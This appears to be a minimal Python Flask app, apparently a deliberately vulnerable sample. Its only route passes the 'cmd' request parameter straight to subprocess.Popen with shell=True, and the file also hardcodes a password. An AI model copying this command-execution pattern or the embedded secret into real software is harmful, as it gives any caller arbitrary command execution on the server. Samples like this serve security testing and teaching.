import subprocess
import flask
from flask import request

app = flask.Flask(__name__)
password = "some_password"

@app.route("/")
def index():
    cmd = request.args.get("cmd")
    subprocess.Popen(cmd, shell=True)
    return "not ok!"
